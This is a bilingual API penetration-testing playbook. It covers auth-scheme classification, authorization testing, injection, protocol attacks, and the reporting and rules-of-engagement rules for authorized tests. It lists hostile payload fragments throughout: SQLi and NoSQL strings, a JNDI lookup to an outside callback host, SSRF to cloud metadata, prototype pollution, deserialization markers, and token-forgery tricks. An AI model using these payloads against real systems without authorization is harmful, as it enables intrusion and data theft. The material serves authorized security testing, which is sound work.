# API VAPT Playbook / API VAPT 操作手册

[English](#english) · [中文](#中文)

---

<a id="english"></a>

## English

> Condensed executable playbook for **VAPT mode** on API targets.

### 0. Identify if the target is an API

Follow this playbook if any of the following holds:
- URL path contains `/api`, `/v1`, `/graphql`, or `/rest`
- Responses return `content-type: application/json`
- `/openapi.json`, `/swagger.json`, or `/v3/api-docs` is present
- Target is an SPA or mobile backend (HTML is only a shell)

### 1. Prerequisites

| Requirement | Why it is required |
|---|---|
| Two accounts at **different privilege levels** (`user`/`admin` or `tenantA`/`tenantB`) | Without a second identity, BOLA/BFLA cannot be tested and authorization coverage must be marked `BLOCKED (single role)` |
| Token / cookie for each account | Authorization evidence must be recorded in pairs |
| Object IDs owned by A and B | Minimum unit for cross-principal authorization checks |
| RoE: allowed HTTP methods, rate limits, data boundaries | State-changing calls and data exports require explicit authorization |

### 1b. Classify the authentication scheme first (14 schemes)

Do not just write "uses a token"—different schemes require different tests, and the report must name the exact scheme:

| # | Scheme | Indicator | Primary test vectors |
|---|---|---|---|
| 1 | Bearer JWT | `Authorization: Bearer a.b.c` | `alg:none`, HS/RS key confusion, `kid` injection, weak HMAC secret, `exp`/`aud` not validated |
| 2 | Opaque access token | 40–64 hex chars | Entropy, TTL, revocation, invalidation after logout |
| 3 | OAuth2 refresh token | `grant_type=refresh_token` | Rotation, replay, client binding |
| 4 | OAuth2 client credentials | `client_id` + `secret` → token | Secret embedded in mobile/frontend bundle, overly broad scope |
| 5 | Basic Auth | `Basic base64(user:pass)` | TLS enforcement, lockout policy, 401 vs. 403 behavior |
| 6 | Digest Auth | `Digest realm/nonce` | Nonce replay, `qop` downgrade |
| 7 | NTLM / Kerberos | `Negotiate` | Relay, SPN, delegation |
| 8 | API key (header) | `X-API-Key` | Scope of key (global vs. resource-scoped), rotation |
| 9 | API key (query) | `?api_key=` | URL/log/Referer leakage |
| 10 | Publishable vs. secret key | `pk_` / `sk_` | **Whether `sk_` is bundled into frontend/mobile code** (`pk_` alone cannot reach D3 sensitive data) |
| 11 | HMAC signature | `X-Signature` + timestamp | Canonicalization mismatch, replay window, path traversal |
| 12 | mTLS | Client certificate | Issuance, revocation, CN-to-tenant mapping |
| 13 | Session cookie | `Cookie: session=` | `HttpOnly`/`Secure`/`SameSite`, fixation, CSRF, logout invalidation |
| 14 | Signed URL / SAS | `?sig=` / `X-Amz-Signature` | TTL, path scope, key substitution |

### 2. Five-stage execution pipeline

#### Stage 1 · Discovery
- Fetch `/openapi.json`, `/swagger.json`, `/v3/api-docs`, `/graphql?query={__schema{types{name}}}`
- Search JS bundles for `/api/`, `secret`, `token`, `tenant`
- Enumerate routes with API wordlists (`kiterunner` / `ffuf`)
- Probe versioned and internal prefixes: `/v1`, `/v2`, `/internal`, `/beta`, `/admin` (older versions frequently lack auth checks)

#### Stage 2 · Authentication
- `jwt_tool`: test `alg=none`, `HS256`↔`RS256` confusion, `kid` injection, and weak HMAC secrets (crack captured tokens offline via `vapt_crack` / `hashcat`)
- Check whether `exp` and `aud` are enforced, whether tokens leak in URLs, and whether refresh tokens rotate
- Rate limiting on login: test **serially**, stop immediately on first lockout, and record the threshold as a positive control

#### Stage 3 · Authorization (core—must capture paired evidence)
- **BOLA**: Request `<OBJ_A>` using `<TOKEN_B>`:
  `GET /api/orders/<OBJ_A>` with `Authorization: Bearer <TOKEN_B>`
  → HTTP 200 **containing A's actual data** = hit (an empty 200 without A's data does not count)
- **BFLA**: Call admin routes or privileged HTTP verbs (`PUT`/`DELETE`/`POST`) using a low-privilege token
- **Mass assignment**: Inject `role`, `tenantId`, `balance`, or `isAdmin` into a valid request body and read back the state via an endpoint that actually returns that field
- **Tenant isolation**: Focus on `filter`, `export`, `search`, and `batch` endpoints

#### Stage 4 · Input & business logic
- **Injection**: JSON fields, query params, headers, multipart bodies (SQLi, NoSQLi `{"$ne":null}`, GraphQL alias/field auth, XXE, SSTI)
- **SSRF**: Any URL-accepting field → `127.0.0.1`, `169.254.169.254`, internal hostnames, OAST callbacks
- **Business logic & race conditions**: Negative quantities, price tampering, coupon stacking, idempotency-key replay, state-machine step skipping, and single-packet / last-byte concurrent double-spend
- **Excessive data exposure**: Compare API responses against the spec for leaked `password`, `hash`, `token`, or `internal` fields

#### Stage 5 · Exploitation ladder (mandatory for every Critical/High finding)
1. Cross-principal **read** (quote B's data fields)
2. Cross-principal **write** (write and read back)
3. Privilege escalation (low-privilege token invoking admin route/verb, or mass-assignment role change)
4. Token forgery (`alg=none`, weak HMAC secret, `kid` / SAML XSW)
5. Credential reuse (`vapt_crack` hash recovery → verified login)
6. Bounded data extraction (total record count + at most 3 redacted sample rows)

If all steps fail, record each step's HTTP status code and response excerpt as `evidence.kind="exploit"` and document which layer blocked exploitation.

### 3. Evidence rules & common pitfalls

- **Paired evidence for authorization**: Always include both Principal A's baseline request and Principal B's cross-principal request.
- **No bulk data dumps**: Record `count + 3 samples` only. If real PII is encountered unexpectedly, stop, log the field names only, and notify the client contact.
- **Clean up test artifacts**: Delete any objects created during testing and record proof of deletion.
- **Common pitfalls to avoid**:
  - Claiming authorization was tested when only one account role was available → must be marked `authz: BLOCKED (single role)`.
  - Treating any HTTP 200 as BOLA without verifying cross-tenant data in the body.
  - Testing only `/v2` while ignoring `/v1`.
  - Treating HTTP 429 as a test failure → 429 is proof that rate-limiting controls work and belongs in the **Positive Controls** section.

---

<a id="中文"></a>

## 中文

> 完整 runbook 在 Obsidian：`VAPT/Workflows/API-VAPT-Process.md`
> （1425 行 / 45 个 step / §0 执行契约 + 逐工具参数 + 技术 playbook + 利用配方 + 测试套件）。
> 本文件是**可执行浓缩版**，供 VAPT mode 直接按步跑；两者口径一致，冲突时以 runbook 为准。

### 0. 判断这是不是 API 目标

任一条成立就走本流程：
- 路径含 `/api`、`/v1`、`/graphql`、`/rest`
- 响应 `content-type: application/json`
- 存在 `/openapi.json`、`/swagger.json`、`/v3/api-docs`
- 站点是 SPA / 移动后端（HTML 只有壳）

### 1. 前置（缺一不可）

| 需要 | 为什么 |
|---|---|
| 两个**不同权限**的账号（user/admin 或 tenantA/tenantB） | 没有第二个身份就测不了 BOLA/BFLA，覆盖率只能记 `BLOCKED` |
| 每账号的 token / cookie | 证据要成对出现 |
| 对象 id（A 的和 B 的） | 越权验证的最小单元 |
| RoE：允许的 method、速率、数据边界 | 写操作与导出必须有授权行 |

### 1b. 先把「用什麼身分」分類清楚（14 種，詳見 runbook Appendix O）

**不要只寫「用 token」**——不同 scheme 測法完全不同，報告也要寫明是哪一種。

| # | Scheme | 看到什麼 | 主要測法 |
|---|---|---|---|
| 1 | Bearer JWT | `Authorization: Bearer a.b.c` | alg none／HS-RS 混淆／kid／弱密鑰／exp 不校驗 |
| 2 | 不透明 access token | 40–64 hex | 熵、有效期、註銷、登出後是否失效 |
| 3 | OAuth2 refresh token | `grant_type=refresh_token` | 輪換、重放、是否綁 client |
| 4 | OAuth2 client credentials | client_id+secret 換 token | secret 是否進手機端、scope 是否過大 |
| 5 | Basic | `Basic base64(user:pass)` | 是否走 TLS、鎖定策略、401 vs 403 |
| 6 | Digest | `Digest realm/nonce` | nonce 重放、qop 降級 |
| 7 | NTLM/Kerberos | `Negotiate` | relay、SPN、委派 |
| 8 | API key（header） | `X-API-Key` | key 的作用域（是否全域）、輪換 |
| 9 | API key（query） | `?api_key=` | 加上日誌／Referer 洩漏 |
| 10 | 可公開鍵 vs 密鑰 | `pk_` / `sk_` | **sk_ 是否被打包進前端/APP** |
| 11 | HMAC 簽名 | `X-Signature` + timestamp | 正規化差異、時間窗、路徑穿越 |
| 12 | mTLS | 客戶端憑證 | 簽發、吊銷、CN→租戶映射 |
| 13 | Session cookie | `Cookie: session=` | HttpOnly/Secure/SameSite、固定、CSRF、登出失效 |
| 14 | 簽名 URL / SAS | `?sig=` / `X-Amz-Signature` | TTL、路徑範圍、key 替換 |

**混合很常見**（session+key、JWT+mTLS）：逐層拆開測，**最弱那層就是發現**。

**Credential 類別（決定能走到哪一級）**：密碼／哈希／bearer token／refresh token／API key（secret 或 publishable）／client secret／service-account JSON／私鑰／平台 PAT（`ghp_` `glpat_` `xoxb_`）／session cookie／webhook 簽名密鑰／DB 連線串／雲端 role token／JWT 簽名密鑰。**publishable key 永遠到不了 D3**，所以報告必須寫類別，不然影響力陳述是假的。

### 2. 阶段与工具

#### 阶段 1 · 发现
```text
GET /openapi.json /swagger.json /v3/api-docs /graphql?query={__schema{types{name}}}
JS 里 grep: /api/、secret、token、tenant
路由枚举（API 字典优先于目录字典）：kiterunner / ffuf
版本探测：/v1 /v2 /internal /beta /admin —— 老版本常缺鉴权
```

#### 阶段 2 · 认证
```text
jwt_tool: alg=none / HS256↔RS256 混淆 / kid 注入 / 弱密钥（抓到 token 后用 hashcat 破 HMAC）
检查：exp 是否校验、aud 是否校验、token 是否出现在 URL、refresh 是否轮换
登录限速：**串行**试，一锁定立刻停并记录阈值（这是正向控制）
```

#### 阶段 3 · 授权（核心，必须成对取证）
```text
BOLA：用 <TOKEN_B> 请求 <OBJ_A>
  GET /api/orders/<OBJ_A>   Authorization: Bearer <TOKEN_B>
  → 200 且响应含 A 的数据 = 命中；只回 200 不回数据 = 不算
BFLA：用低权 token 打管理员路由/动词
Mass assignment：在合法 body 里加 role/tenantId/balance/isAdmin，再读回
租户隔离：filter / export / search / batch 接口最容易漏
```

#### 阶段 4 · 输入与逻辑
```text
注入：JSON 字段、query、header、multipart（sqlmap 仅限授权参数）
SSRF：任何接受 URL 的字段 → 127.0.0.1 / 169.254.169.254 / 内网域名 / OAST 回连
限速绕过：换 token / 换 IP / 换 tenant / 加 header
业务逻辑：负数量、价格篡改、优惠券叠加、幂等键重放、**两请求并发**双花、状态机跳步
过量数据：对比 spec 与实际响应，找 password/hash/token/internal 字段
```

#### 阶段 5 · 利用阶梯（每条 critical/high 必走）
1. 跨主体**读**（引 B 的数据字段）
2. 跨主体**写**（写后读回）
3. 提权（低权调到管理员路由/动词，或 mass assignment 改 role）
4. 伪造 token（alg=none / 弱 HMAC / kid）
5. 凭据复用（`vapt_crack` 破哈希 → 真实登录）
6. 有界取数（数量 + 3 条样本）

全失败 → 记录每一步响应码与原话为 `evidence.kind="exploit"`，并在报告写清卡在哪一层。

### 3. 证据规则

- 每个发现：原始请求（可粘贴）+ 响应片段 + 命令原文
- 越权必须**成对**：A 的请求 + B 的请求
- 数据：数量 + 3 条样本，不做批量导出
- 自己创建的对象必须删除并证明删除

### 4. 报告最小结构

1. 三个数字：测了多少 endpoint / 越权命中几条 / 已利用几条
2. 范围、盒模型、攻击者模型、**没测什么**
3. 按严重度列发现（CVSS v4.0 + vector、OWASP API 分类、CWE）
4. 攻击链（多步，带请求序列）
5. 覆盖登记（每阶段 PASS/PARTIAL/BLOCKED/SKIPPED + 原因）
6. 正向控制（哪些防护真的挡住了）
7. 修复路线（按根因归类，不逐症状）
8. `assumed:` 块（unattended 模式下的默认决定）

### 5. 常见坑

| 坑 | 正确做法 |
|---|---|
| 只测一个账号就宣称测了授权 | 明确写 `authz: BLOCKED (single role)` |
| 200 就当越权 | 必须看到对方数据或状态变化 |
| 用 GET 猜 DELETE 的权限 | 动词要真的发，但写操作先看 RoE |
| 只测 `/v2` | `/v1` 常是缺口 |
| 把 429 当失败 | 429 是**控制有效**的证据，记进正向控制 |

### 6. 银行 / Apigee 网关情境（完整版见 runbook Appendix P）

这类目标的特殊点，**generic 流程会漏掉**：

| 项目 | 实际做法 |
|---|---|
| 双凭据 | 每个请求同时带 `Authorization: Bearer <token>` **和** `apiKey: <client_id>`；少一个 401 |
| token 很短 | `expires_in: 179` 秒、**没有 refresh token** → 401 就重跑 `client_credentials`，每个请求只重试一次 |
| API product 作用域 | 用 A proxy 的凭据打 B proxy／打生产 → 必须被拒（`InvalidApiKeyForGivenResource`）；200 就是 critical |
| 网关故障名 | 记下 `steps.oauth.v2.FailedToResolveAPIKey` / `oauth.v2.InvalidAccessToken`；未部署路径是 **403** 不是 404 |
| SQL 关键字过滤 | 只过滤**命名 query 参数** → 把同一 payload 放进 **JSON body / 未命名参数** 试；编码变体（`%27`、`%2527`、`/**/`、`/*!50000*/`、大小写） |
| JSON threat protection | 深度/条目数/字符串长度（如 4000 entries、10000 chars）；UAT 有、生产没挂 → 控制缺口 |
| 限流 | spike arrest（突发平滑）≠ quota（窗口计数）；**客户说不要压测就别压**，覆盖率记 `not exercised (client instruction)` |
| 无 OpenAPI | **Postman collection 就是规格**：`jq` 解析 `item[]` → method/URL/headers/body → inventory，再与平台 Swagger 做差集 |
| ABP/BRICK 平台 | `/api/services/app/<Service>/<Method>`：试 `MaxResultCount=1000000`、`SkipCount` 负数、`Abp.TenantId` 换租户、POST 变体绕过 query 过滤 |
| 状态机 | 只允许 6/8（PF）或 Cancel/Accept/Decline（VF）；测跳态、重复、并发（期望 409）、终态回退 |
| 上传 | multipart 带 `fileType/fileId/fileName`；测 content-type 信任、fileId 跨应用复用、applicationId 越权 |
| RFC 7807 | `{"type","title","status","detail","instance"}`；`detail` 常泄露内部枚举（如 `status must be one of 6,8`） |
| PDPA / 数据 | 只用甲方提供的测试身份；不做批量导出（count + 3 样本）；**意外见到 PII：停、记、当天通知联系人、报告只写字段名** |

**这类的典型发现**：UAT 凭据被生产接受 · SQL 过滤只管 query 不管 body · `MaxResultCount` 无上限（批量导出） · `Abp.TenantId` 可换租户 · 平台 Swagger 公网可达 · 状态机允许终态回退 · 并发转换都成功 · 生产缺 JSON threat protection。

### 7. 类型识别（36 种总表，完整版见 runbook §1.6 + 附录 L/Q/R/S）

**先声明类型，再决定权重**。一个目标 = 类型 × 网关 × 行业三层。

| 类别 | 类型（编号见 runbook） |
|---|---|
| **HTTP 风格** | REST/JSON (1) · REST/XML (2) · GraphQL (3) · GraphQL federation (4) · OData (9) · JSON-RPC (10) · SOAP/WSDL (8) |
| **RPC / 流** | gRPC (5) · gRPC-Web (6) · Connect/Twirp (7) · WebSocket (11) · SSE (12) · WebRTC 信令 (31) |
| **异步 / 事件** | Webhook (13) · Kafka/RabbitMQ/SQS (14) · 批处理/文件投递 (36) |
| **框架型** | Serverless (15) · tRPC/BFF (16) · Next.js API routes (17) |
| **資料即 API** | PostgREST/Supabase/Hasura (18) · Firebase RTDB/Firestore (19) |
| **儲存 / 檔案** | S3/GCS/Azure Blob (20) · 檔案/CDN (21) · HLS/DASH (22) |
| **行業 API** | 支付/PSP (23) · Open Banking/FAPI (24) · 電信/CAMARA (25) · FHIR (26) · ERP/SAP (27) |
| **遺留 / 主機** | 遺留 RPC (28) · 大型機/MQ (29) · IoT/MQTT (30) |
| **身分 / 控制面** | SCIM/OIDC (32) · K8s/雲/Docker (33) |
| **AI / Agent** | LLM API (34) · MCP/agent 工具 (35) |

**網關（附錄 Q）**：Apigee · AWS API GW · Azure APIM · Kong · MuleSoft · WSO2 · Envoy/Istio · Spring Cloud Gateway · nginx+Lua · Cloudflare · Tyk · KrakenD。

**行業（附錄 R）**：銀行 P · Open Banking · 支付 PCI · 保險 · 電信 · 醫療 FHIR · 政府 · SaaS · AI · IoT/OT · ERP · 內部平台。

**規則**：沒有聲明 `type` / `gateway` / `domain_profile` 的 run，一律記 `PARTIAL`——報告不能宣稱沒界定過的覆蓋。遇到表上沒有的類型 → 走 §3.6 擴展程序，並回填總表。

### 8. 協議層與進階家族（完整版見 runbook 附錄 T/U/V/W/X/Y/Z）

#### 8.1 協議層（這些繞過前面所有應用層授權）
| 測什麼 | 怎麼測 | 命中長什麼樣 |
|---|---|---|
| 請求走私 | CL.TE / TE.CL / TE.TE / 重複 CL；先做無害 desync 探針 | 只有後端處理了第二個請求才會出現的響應 |
| Host / forwarded | `Host:`、`X-Forwarded-Host`、`X-Forwarded-For: 127.0.0.1`、`X-Original-URL` | 重置信寄到攻擊者域名 / 管理路由 200 / 沒有 429 |
| CORS | `OPTIONS` + `Origin: https://attacker.example` | 回顯該 Origin **且** `Allow-Credentials: true` = critical |
| 快取毒化 | 未鍵控 header（`X-Forwarded-Host`） | 別人拿到被污染的響應 |
| 快取欺騙 | `GET /api/v1/me/x.css` | B 拿到 A 的 body |
| h2c / HTTP/2 | `:path` 用 `%2f`、大小寫 | 繞過只檢查 HTTP/1.1 的邊緣 |

#### 8.2 注入家族（通用掃描器不會試）
NoSQL 運算子 `{"$ne":null}` / `{"$where":…}` · ORM/HQL `?sort=id,(select …)` · LDAP `*)(uid=*` · XPath · JSONPath `$..*` · ES `query_string` · SSTI `{{7*7}}` / `${7*7}` · 命令注入（轉檔/檔名/公式） · 解析器差異（重複 JSON key、`\u0000`、charset、content-type 不符、multipart 邊界注入） · 反序列化（Java `rO0AB`、.NET `AAEAAAD`、Python `gASV`、PHP `O:8:`、Node `_$$ND_FUNC$$_`、Ruby `\x04\x08`）

#### 8.3 競態（別用 `curl &`）
`curl &` 間隔 1–50ms → 看不到窗口。要：**last-byte sync**（HTTP/1.1）或 **single-packet attack**（HTTP/2）。先順序打兩次拿到控制組（第二次被拒），再並發 N=2 然後 N=20，**必須讀回狀態**（餘額/記錄數）才算數。

#### 8.4 OAuth 進階
PKCE（`plain` / verifier 不驗）· PAR（`request_uri` 重用 / 可跳過 PAR）· JARM（簽名不驗）· **DPoP**（不帶 `DPoP` 標頭仍給資源 / `jti` 重放）· **mTLS 綁定 RFC 8705**（不帶憑證仍可用 = critical）· **token exchange RFC 8693**（低權換高權 / `act` 不保留）· device flow（`user_code` 可爆）· OIDC 宣告（`aud`/`iss`/`nonce`/`email_verified` 不驗）

#### 8.5 規格外的發現
Postman 公開集合 · RapidAPI · apis.guru · GitHub 搜 SDK/`baseUrl`/`.env` · Wayback CDX · source map · crt.sh 找 `api-*` 主機 · 行動 APP 字串

#### 8.6 自動化（有規格時）
`schemathesis`（`--rate-limit`/`--workers` 就是爆炸半徑旋鈕）· `RESTler`（**179 秒 token 必須用 `--token_refresh_cmd`**）· 授權矩陣腳本（逐 route 成對請求，自動存雙邊原始請求）· `oasdiff` 做版本漂移

#### 8.7 影響力評級
資料分級 D0 公開 / D1 內部 / D2 個資 / D3 敏感個資（身分證、收入）/ D4 財務 / D5 密鑰；數量級 S1 單筆 … S5 >1 萬。**跨租戶讀 D3 多筆 → 9.0 起跳**，CVSS 算低於這個地板要說明理由。

### 9. SOAP / 大型機 / 框架專屬 / 訊息層加密（runbook 附錄 AA–AD）

#### 9.1 SOAP / WS-Security / SAML（銀行遺留系統）
| 測什麼 | payload | 命中 |
|---|---|---|
| UsernameToken 重放 | 重送同一 `Nonce`+`Created` | 仍被接受 |
| 明文密碼 | `PasswordText` over HTTP | critical |
| 簽章範圍不足 | 只簽 `Body` 不簽 `Timestamp`/`UsernameToken` | 標頭可竄改 |
| **SAML XSW** | 移動已簽章 assertion、插入偽造 assertion | 偽造身分被接受 |
| SAML 不驗 `Audience`/`NotOnOrAfter`/`InResponseTo` | 換 SP、過期、非應答 | critical |
| XXE / XML bomb | `<!DOCTYPE` 外部實體、嵌套實體 | 檔案讀取／DoS |
| `SOAPAction` 授權 | 空字串 vs 具名 | 動作混淆 |

#### 9.2 大型機 / CICS / MQ
`tranCode` 替換（`INQ1` → `DLT1`）· `queueName` 穿越（`APP.INQ` → `APP.ADMIN`）· payload 裡的 `userId`（不是從 session 取）· copybook 欄位溢位／截斷（`ACCT1234567890` → `ACCT1234`）· EBCDIC/ASCII 混淆 · `MQMD.UserIdentifier` 偽造 · 3270 原始按鍵注入。**只跑唯讀交易碼**，除非 RoE 明寫。

#### 9.3 語言／框架專屬
| 堆疊 | 攻擊 |
|---|---|
| Java/Spring | **JNDI**（`${jndi:ldap://OAST/a}` 放在任何會被記錄的欄位）· **SpEL** `${T(java.lang.Runtime)…}` · `/actuator/env`、`/heapdump` · Java 反序列化 `rO0AB` · HQL |
| .NET | **ViewState** `AAEAAAD/////` · `TypeNameHandling` `{"$type":…}` · `__VIEWSTATE` 偽造 |
| Node | **原型污染** `{"__proto__":{"isAdmin":true}}` · `node-serialize` `_$$ND_FUNC$$_` · ReDoS |
| PHP | 型別鬆散比較 `{"password":true}` / `0e` magic hash · `O:8:` 物件注入 · `phar://` |
| Python | `pickle` `gASV` · `eval` 欄位 · Jinja2 `{{config}}` |
| Ruby | `Marshal` `\x04\x08` · `YAML.load` · ERB `<%= 7*7 %>` |

**通用**：HPP（`?role=user&role=admin`）· 二次注入（存進去、報表才觸發）· **stored XSS via API → 管理後台** · CSV/formula 注入 · **日誌注入**（`X-Forwarded-For: 1.1.1.1\r\nadmin=true`）

#### 9.4 訊息層加密（JWS/JWE）
`alg:none` · HS/RS 混淆 · `kid` 注入 · `jku`/`x5u` 指向攻擊者 · 只簽部分欄位（改 `amount`）· JWE `RSA1_5` padding oracle · **簽章請求重放**（時間戳／nonce／路徑綁定）· **欄位加密金鑰由公開值派生**（= 加密退化成編碼）

#### 9.5 用 146 項總檢查清單證明沒漏
runbook **附錄 AF** 是唯一清單：146 行，每行 = 測試項 + 章節 + 權重（must/should/must-if）。交付前跑三項自審：**≥146 行、無空白格、每個附錄至少被引用一次**。任一項不過 → 不可交付。

### 10. 實驗室驗證結論（19 個案例實跑，不是文獻）

| 類別 | 案例 | 靶場 | 結果 |
|---|---|---|---|
| BOLA | `GET /users/v1/{name}` | VAmPI | ✅ 回他人 email（**不含 password**） |
| BOLA | 讀他人訂單 | crAPI | ✅ 回對方 email/電話/交易號 |
| BFLA | mechanic_report | crAPI | ✅ 普通用戶 200（3 個 report 都通） |
| Mass assignment | 註冊帶 `admin:true` | VAmPI | ✅ `/me` 回 `admin:true`（**用戶記錄端點不回該欄位**） |
| SQLi | 路徑參數 | VAmPI | ✅ `x' OR '1'='1` → 他人記錄 |
| SQLi | JSON body | Juice Shop | ✅ `' OR 1=1--` → admin token |
| SQLi | 傳統表單 | DVWA | ✅ 多行回傳 |
| NoSQL | `{"password":{"$ne":"x"}}` | Mongo lab | ✅ 直接登入 admin |
| XXE | 外部實體 | lxml lab | ✅ 讀到 `TOP-SECRET-TOKEN-ABC123` |
| XML bomb | 6×10 嵌套 | lxml lab | ⛔ 解析器攔下（正向控制） |
| JWT | `alg:none` | VAmPI | ⛔ 401 被拒 |
| JWT | 弱密鑰 `random` | VAmPI | ✅ 偽造 admin token 200 |
| WSS | Nonce 重放 | SOAP lab | ✅ 原樣重放仍 200 |
| SAML | **XSW** | SP lab | ✅ 偽造 admin 通過簽章驗證 |
| CORS | Origin 反射 | httpbin | ✅ ACAO + credentials |
| Host 頭 | 原樣到達 | httpbin | ✅ |
| **走私** | TE.CL desync | 自建前後端 | ✅ 第二個響應 `SMUGGLED path=/admin/deleteAll` |
| 競態 | 20 並發 | 自建 lab | ✅ 20×200，餘額 applied=20 |
| GraphQL | 欄位級授權 + alias | GraphQL lab | ✅ 洩 `sk_live_admin`；一次請求 4 個對象 |

**三條回寫進流程的教訓**：JWT 不能停在 `alg:none`（要測密鑰與宣告）· 回讀要用真的會回該欄位的端點 · `_debug` 對非管理員也開放，不能當權限判別。

**未驗證（報告不可引用）**：gRPC、WebSocket、主機/MQ、FAPI mTLS、支付/電信/FHIR、h2c 單包。
